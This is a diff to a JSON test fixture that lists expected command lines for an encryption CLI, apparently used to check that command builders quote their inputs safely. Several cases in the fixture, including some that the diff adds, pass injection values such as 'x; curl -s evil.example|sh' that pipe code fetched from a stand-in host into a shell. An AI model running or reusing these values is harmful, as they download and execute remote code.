@@ -11,7 +11,7 @@
     },
     {
       "path": "ui/shared/src/encryption/encryptionCommands.ts",
-      "sha256": "ae15669a2ae016f7ab4395438315b097fa7f1364882b583a23e6c036bde0709b"
+      "sha256": "6724e25530ed4d960b3f4e04029ba620ebab7819a482725ae5d94e34be7baa2e"
     },
     {
       "path": "ui/shared/src/hooks/runCommands.ts",
@@ -31,7 +31,7 @@
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "161606ab0e3738aae698d2e642cce22e8d6ce4fbffee66db0493afc084c117e5"
+      "sha256": "842437fd86d4847ff42675af89336cad8d8f290b338a915133e5882e596006c8"
     }
   ],
   "twins": [
@@ -544,6 +544,66 @@
       "fn": "verifyCommand",
       "case": "a hostile id and medium",
       "line": "retnd encryption verify 'api-server/x; id|sh/y; id' --medium 'x; curl -s evil.example|sh' --allow-egress"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "suitesCommand",
+      "case": "the registry",
+      "line": "retnd encryption suites"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "a suite",
+      "line": "retnd encryption policy patch --suite age-pq/v1"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "a hostile suite",
+      "line": "retnd encryption policy patch --suite 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyCreateCommand",
+      "case": "under a suite",
+      "line": "retnd encryption key create --suite age-pq/v1"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyRotateCommand",
+      "case": "to another suite",
+      "line": "retnd encryption key rotate --suite age-pq/v1"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "reencryptCommand",
+      "case": "a suite, dry run",
+      "line": "retnd encryption reencrypt --suite age/v1 --dry-run"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "reencryptCommand",
+      "case": "a suite to a medium",
+      "line": "retnd encryption reencrypt --suite age/v1 --to offsite_cold"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "reencryptCommand",
+      "case": "a key to a medium",
+      "line": "retnd encryption reencrypt --key mk-2026-08-14-a --to offsite_cold"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "reencryptCommand",
+      "case": "every deprecated suite, dry run",
+      "line": "retnd encryption reencrypt --deprecated --dry-run"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "reencryptCommand",
+      "case": "hostile values",
+      "line": "retnd encryption reencrypt --suite 'x; curl -s evil.example|sh' --to 'x; curl -s evil.example|sh'"
     },
     {
       "module": "hooks/runCommands",
